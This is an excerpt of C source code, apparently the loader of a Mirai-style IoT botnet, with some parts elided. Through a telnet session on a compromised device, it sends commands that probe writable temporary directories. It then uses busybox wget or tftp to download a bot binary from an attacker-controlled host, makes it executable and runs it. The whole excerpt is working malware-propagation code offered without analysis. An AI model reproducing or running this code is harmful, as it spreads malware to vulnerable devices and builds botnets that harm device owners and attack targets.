        ...
        while(TRUE)
        {
            ...
            while(TRUE)
            {
                ...
                switch(conn->state_telnet)
                {
                    ...
                    case TELNET_READ_WRITEABLE:
                        for(j = 0; j < 13; j++)
                        util_sockprintf(conn->fd, ">%s.nemesistest && cd %s\r\n", tmp_dirs[j], tmp_dirs[j]);
                        ...
                        if(consumed)
                        {
                            ...
                            switch(conn->info.upload_method)
                            {
                                ...
                                case UPLOAD_WGET:
                                    ...
                                    conn->timeout = 120;
                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/%s.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    wrker->srv->wget_host_ip, wrker->srv->wget_host_port, biname, conn->info.arch);
                                    #ifdef DEBUG
                                        printf("wget\n");
                                    #endif
                                    break;
				                case UPLOAD_TFTP:
                                    ...
                                    util_sockprintf(conn->fd, "/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    FN_BINARY, biname, conn->info.arch, wrker->srv->tftp_host_ip);
				    				#ifdef DEBUG
                                    	printf("tftp\n");
			 	    				#endif
                                    break;
                    ...
                    case TELNET_UPLOAD_ECHO:
                        ...
                        if(consumed)
                        {
                            ...
                            if(strncmp(conn->info.arch, "arc", 3) == 0)
                                util_sockprintf(conn->fd, "./%s;./%s telnet.%s.echo; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, conn->info.arch);
                            else
                                util_sockprintf(conn->fd, "./%s;./%s telnet.%s.echo; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, conn->info.arch);
                    ...
                    case TELNET_UPLOAD_WGET:
                        ...
                        if(consumed > 0)
                        {
                            ...
                            #endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " telnet.%s.wget; " EXEC_QUERY "\r\n", conn->info.arch);
		    ...
		    case TELNET_UPLOAD_TFTP:
                        ...
                        if(consumed > 0)
                        {
			    			...
			    			#endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " telnet.%s.tftp; " EXEC_QUERY "\r\n", conn->info.arch);
